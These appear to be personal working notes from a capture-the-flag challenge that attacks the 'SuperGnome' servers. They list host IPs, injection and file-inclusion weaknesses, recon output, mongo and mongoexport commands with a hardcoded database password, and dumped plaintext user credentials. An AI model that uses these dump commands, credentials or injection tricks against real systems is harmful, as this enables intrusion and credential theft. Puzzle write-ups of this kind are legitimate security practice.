

process
	javascript injection on sg04
		mongodb dump on sg04, get nedford login and grab files
	lfi vulnerability on sg02
		find stuart password looking through mongod.conf log of sg02
	use stuarts log in on sg01


52.2.229.189 	SuperGnome 1 COMPLETE! Initial foot in the door
					* can log in with user:user  but cannot do anything
					* STUART LOG IN is stuart:MyBossIsCrazy
					* HAS ABILITY TO UPLOAD FILES
					* can we dump mongodb?
						- cannot do lfi easily,

52.34.3.80		SuperGnome 2 COMPLETE! HAS LFI VULNERABILITY: COMBINATION OF SETTINGS CREATE DIRECTORY AND USING CAM?CAMERA= WITH .png IN NAME	
	* can log in with user:user  but cannot do anything
	* still need to pillage mongodb for Auggie's password
		* can we? Need shell access to run a mongo query
			* the ubuntu user is likely the default Ubuntu user, it should have no password. We just need a shell to log in with it.
		* can we grab the file of the mongodb...? where is it, do we have access?
		 ... only mongo-admin has access to the file in /var/lib/mongodb/gnome.0
		* could we access it with the shell from SG04? 
		* IP and MAC address found from /var/log/boot.log
		ci-info: |  eth0  | True | 172.31.24.90 | 255.255.240.0 | 02:3c:a5:ff:55:0b |

		* THE bind_ip CONFIGURATION OF MONGODB (/etc/mongod.conf) IS NOT LETTING US REMOTE INTO THIS DB. It is currently 127.0.0.1 and we need it to be 0.0.0.0
			- can we change it without replacing the config file?


52.64.191.71	SuperGnome 3 DIFFERENT ADMIN PASSWORD
	* can log in with user:user  but cannot do anything

52.192.152.132	SuperGnome 4 COMPLETE! NNEDFORD ABLE TO DOWNLOAD
	* can log in with user:user  but cannot do anything
	* we have only read-out shell
		* the ubuntu user is likely the default Ubuntu user, it should have no password. We just need a shell to log in with it.
		* ubuntu user's bash_history is redirected to /dev/null. This is clearly an attack vector.
	* intranet IP address is 172.31.20.200  (/sbin/ifconfig)
	* broadcast address is 172.31.31.255
	* gateway apparently 172.31.16.1 (/sbin/route -n)

		bash$ /usr/sbin/arp -n
		Executing "/usr/sbin/arp -n"...
		Command executed.
		Address                  HWtype  HWaddress           Flags Mask            Iface
		172.31.16.1              ether   06:a6:9e:bb:f4:cf   C                     eth0


		* ping a broadcast does not return any other hosts
			WARNING: pinging broadcast address
			PING 172.31.31.255 (172.31.31.255) 56(84) bytes of data.

			--- 172.31.31.255 ping statistics ---
			3 packets transmitted, 0 received, 100% packet loss, time 1999ms
	* subnet mask is 255.255.240.0

54.233.105.81 	SuperGnome 5 HAS 3389 RDP OPEN
	* can log in with user:user  but cannot do anything


W NETWORK  Failed to connect to 172.31.20.200:27017, reason: errno:111 Connection refused


database tends to live at /var/lib/mongodb/gnome.0

router IP 
	172.31.16.1

mongo gnome --host localhost --username gnome --password KTt9C1SljNKDiobKKro926frc --port 27017 --eval "db.getCollectionNames()"
mongo gnome --host 172.31.20.200 --username gnome --password KTt9C1SljNKDiobKKro926frc --port 27017 --eval "db.getCollectionNames()"

		mongoexport --db gnome --host localhost --username gnome --password KTt9C1SljNKDiobKKro926frc --collection users
		mongoexport --db gnome --host 172.31.24.90 --username gnome --password KTt9C1SljNKDiobKKro926frc 

mongoexport --db gnome --host localhost --username gnome --password KTt9C1SljNKDiobKKro926frc --port 27017 -c users
mongoexport --db gnome --host 52.192.152.132 --username gnome --password KTt9C1SljNKDiobKKro926frc --port 27017 -c users # DOES NOT WORK

2015-12-14T21:19:11.420+0000	connected to: localhost:27017
{"_id":{"$oid":"56229f58809473d11033515b"},"username":"user","password":"user","user_level":10.0}
{"_id":{"$oid":"56229f63809473d11033515c"},"username":"admin","password":"SittingOnAShelf","user_level":100.0}
{"_id":{"$oid":"5647438777cb0339cd14fd09"},"username":"nedford","password":"AllIWantForXmasIsYourPresents","user_level":100.0}
2015-12-14T21:19:11.421+0000	exported 3 records




looking through mongod.log of sg02 found
2015-11-14T14:17:35.365+0000 I ACCESS   [conn2] Unauthorized not authorized on gnome to execute command { insert: "users", documents: [ { _id: ObjectId('5647427faa0c260219855e00'), username: "stuart", password: "MyBossIsCrazy", user_level: 1000.0 } ], ordered: true }
	stuart: MyBossIsCrazy

another user... user:user
				admin:xxx
				$gt:$gt
